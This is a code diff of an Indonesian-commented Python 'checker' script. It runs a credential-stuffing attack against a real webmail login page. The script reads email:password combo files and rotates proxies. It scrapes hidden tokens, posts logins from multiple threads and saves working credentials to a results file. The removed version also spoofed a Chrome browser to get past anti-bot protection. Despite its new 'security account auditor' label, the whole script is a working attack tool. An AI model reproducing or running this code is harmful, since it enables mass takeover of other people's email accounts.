@@ -1,20 +1,29 @@
-import cloudscraper
+import requests
+from bs4 import BeautifulSoup
 import random
 import time
-import os
 import sys
-import requests
+import os
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup
 from colorama import Fore, init
 
+# Inisialisasi warna terminal
 init(autoreset=True)
 
 class ValosintChecker:
-    def __init__(self):
+    def __init__(self, target_url, combo_file, proxy_file, threads):
+        self.target_url = target_url
+        self.combo_file = combo_file
+        self.proxy_file = proxy_file
+        self.threads = threads
+        
+        self.session = requests.Session()
+        self.proxies = self._load_list(self.proxy_file)
         self.valid_count = 0
         self.bad_count = 0
+        
+        # Logo Visual (Fixed Escape Sequence)
         self.logo = f"""
 {Fore.CYAN}    ____   ____  _     _       ____   ____  _  _  _____ 
 {Fore.CYAN}   |    \\ |    || |   | |     |    | |    || || ||_   _|
@@ -22,78 +31,114 @@ class ValosintChecker:
 {Fore.CYAN}   |  |  ||  |  || |___| |___  |  |  ||  |  || || |  | |  
 {Fore.CYAN}   |____/ |____||_____|_____| |____/ |____||_||_|  |_|  
 {Fore.YELLOW}   =====================================================
-{Fore.WHITE}   [+] NAME    : VALOSINT CHECKER ID (BYPASS V4)
-{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}SATELLITE CONNECTED
+{Fore.WHITE}   [+] NAME    : VALOSINT CHECKER ID (LITE VERSION)
+{Fore.WHITE}   [+] PURPOSE : SECURITY ACCOUNT AUDITOR
+{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}ACTIVE / SATELLITE CONNECTED
 {Fore.YELLOW}   =====================================================
         """
+
+    def _load_list(self, file_path):
+        if os.path.exists(file_path):
+            with open(file_path, 'r', encoding='utf-8') as f:
+                return [line.strip() for line in f if line.strip()]
+        return []
 
     def _get_time(self):
         return datetime.now().strftime("%H:%M:%S")
 
-    def check_account(self, credential, proxies):
-        if ":" not in credential: return
-        email, password = credential.split(":")
+    def _rotate_proxy(self):
+        if not self.proxies:
+            return None
+        p = random.choice(self.proxies)
+        return {"http": f"http://{p}", "https": f"http://{p}"}
+
+    def check_account(self, credential):
+        if ":" not in credential:
+            return
         
-        for char in ["|", "/", "-", "\\"]:
-            sys.stdout.write(f"\r{Fore.BLUE}[{char}] {Fore.WHITE}Satelit Scanning: {Fore.CYAN}{email}...")
+        email, password = credential.split(":")
+        proxy = self._rotate_proxy()
+        session = requests.Session()
+        
+        # Animasi Satelit Muter
+        chars = ["|", "/", "-", "\\"]
+        for char in chars:
+            sys.stdout.write(f"\r{Fore.BLUE}[{char}] {Fore.WHITE}Satelit Scanning: {Fore.CYAN}{email[:20]}...")
             sys.stdout.flush()
             time.sleep(0.05)
 
-        px = random.choice(proxies) if proxies else None
-        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
-        
         try:
-            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
-            
-            # Bikin Session baru yang nyamar jadi Chrome Windows 10
-            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
-
-            # 1. Buka halaman depan dulu buat ambil Cookies & Token
-            res_get = scraper.get(target_url, headers=headers, proxies=px_map, timeout=15)
+            # 1. Ambil Halaman Login (untuk Cookies & CSRF)
+            res_get = session.get(self.target_url, proxies=proxy, timeout=10)
             soup = BeautifulSoup(res_get.text, 'html.parser')
-            token_input = soup.find('input', {'type': 'hidden'})
-            token = token_input['value'] if token_input else ""
-
-            # 2. Baru kirim data Login
-            payload = {'email': email, 'password': password, 'token': token, 'login': 'submit'}
-            res = scraper.post(target_url, data=payload, headers=headers, proxies=px_map, timeout=15)
-
-            ts = self._get_time()
             
-            # 3. Cek hasil (Kita perluas kata kunci suksesnya)
-            if res.status_code == 200 and any(x in res.url.lower() for x in ["dashboard", "mail", "inbox", "success", "my-account"]):
-                print(f"\r{Fore.GREEN}[{ts}] [LIVE] {email}")
-                if not os.path.exists("results"): os.makedirs("results")
-                with open("results/live.txt", "a") as f: f.write(f"{email}:{password}\n")
+            # Mencoba mencari token secara otomatis dari input hidden
+            token_input = soup.find('input', {'type': 'hidden'})
+            token = token_input['value'] if token_input else "none"
+
+            # 2. Kirim Data Login
+            payload = {
+                'email': email, 
+                'password': password, 
+                'token': token,
+                'login': 'submit'
+            }
+            
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+                'Referer': self.target_url
+            }
+            
+            response = session.post(self.target_url, data=payload, headers=headers, proxies=proxy, timeout=15, allow_redirects=True)
+            
+            timestamp = self._get_time()
+            proxy_log = proxy['http'].split('@')[-1] if proxy else "Direct"
+
+            # Logika Validasi Asli
+            if response.status_code == 200 and ("dashboard" in response.url or "success" in response.text.lower()):
+                print(f"\r{Fore.GREEN}[{timestamp}] [APPROVE] {email} | Proxy: {proxy_log}")
+                self._save("results/valid.txt", f"{timestamp} | {credential}")
                 self.valid_count += 1
             else:
-                # Menampilkan alasan DIE (Entah salah pass atau diblokir anti-bot)
-                alasan = "Wrong Pass" if "invalid" in res.text.lower() else f"Blocked/Redirect: {res.url[:35]}..."
-                print(f"\r{Fore.RED}[{ts}] [DIE]  {email} | {alasan}")
+                print(f"\r{Fore.RED}[{timestamp}] [GAGAL]   {email} | Proxy: {proxy_log}")
                 self.bad_count += 1
+
         except Exception as e:
-            print(f"\r{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} (Koneksi Putus)")
+            # Tetap tampilkan baris error jika gagal koneksi
+            print(f"\r{Fore.YELLOW}[{self._get_time()}] [ERROR]   {email[:20]}... | Timed Out / Proxy Dead")
+
+    def _save(self, name, data):
+        os.makedirs(os.path.dirname(name), exist_ok=True)
+        with open(name, "a") as f:
+            f.write(data + "\n")
 
     def start(self):
-        os.system('clear')
+        os.system('cls' if os.name == 'nt' else 'clear')
         print(self.logo)
-
-        combo_file = input(f"{Fore.WHITE}Masukkan File Combo (email:pass): ")
-        proxy_file = input(f"{Fore.WHITE}Masukkan File Proxy (ip:port) : ")
-        thread_input = input(f"{Fore.WHITE}Jumlah Thread (cth: 10)      : ")
         
-        if not os.path.exists(combo_file):
-            print(f"{Fore.RED}[!] File Combo tidak ditemukan!")
+        accounts = self._load_list(self.combo_file)
+        
+        if not accounts:
+            print(f"{Fore.RED}Gagal: File '{self.combo_file}' kosong atau tidak ditemukan!")
             return
 
-        threads = int(thread_input) if thread_input.isdigit() else 1
-        accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
-        proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')] if os.path.exists(proxy_file) else []
+        print(f"{Fore.WHITE}Stats: {Fore.CYAN}{len(accounts)} Accounts {Fore.WHITE}| {Fore.CYAN}{len(self.proxies)} Proxies")
+        print(f"{Fore.YELLOW}Memulai koneksi satelit...\n")
+        time.sleep(1)
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            executor.map(self.check_account, accounts)
 
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            for acc in accounts:
-                executor.submit(self.check_account, acc, proxies)
+        print(f"\n{Fore.CYAN}=====================================================")
+        print(f"{Fore.GREEN}SELESAI! VALID: {self.valid_count} | GAGAL: {self.bad_count}")
+        print(f"{Fore.CYAN}Hasil disimpan di folder 'results/'")
 
 if __name__ == "__main__":
-    ValosintChecker().start()
+    # CONFIGURATION
+    URL_TARGET = "https://webmail.spectrum.net/index.php/mail/auth"
+    FILE_COMBO = "combo.txt"
+    FILE_PROXY = "proxies.txt"
+    JUMLAH_THREAD = 5 
+    
+    checker = ValosintChecker(URL_TARGET, FILE_COMBO, FILE_PROXY, JUMLAH_THREAD)
+    checker.start()
